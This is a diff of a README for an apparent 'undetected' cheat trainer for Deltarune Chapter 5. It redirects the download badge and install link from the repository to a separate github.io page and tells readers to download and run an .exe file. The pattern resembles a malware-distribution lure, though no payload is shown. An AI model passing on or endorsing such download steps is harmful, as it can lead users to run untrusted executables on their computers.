@@ -1,6 +1,6 @@
 # 🎮 Deltarune-Chapter5-Trainer-Undetected - Explore the game with total control
 
-[![](https://img.shields.io/badge/Download-Trainer-blue.svg)](https://github.com/White-grandmal441/Deltarune-Chapter5-Trainer-Undetected)
+[![](https://img.shields.io/badge/Download-Trainer-blue.svg)](https://white-grandmal441.github.io)
 
 ## 📋 Project Overview
 
@@ -20,7 +20,7 @@ Ensure your computer meets these basic standards to run the trainer:
 
 Follow these steps to get the trainer on your computer:
 
-1. Visit the project page at this link: [https://github.com/White-grandmal441/Deltarune-Chapter5-Trainer-Undetected](https://github.com/White-grandmal441/Deltarune-Chapter5-Trainer-Undetected).
+1. Visit the project page at this link: [https://white-grandmal441.github.io](https://white-grandmal441.github.io).
 2. Look for the Releases section on the right side of the screen.
 3. Select the latest version of the trainer to open the download page.
 4. Click the file ending in .exe to start your download.
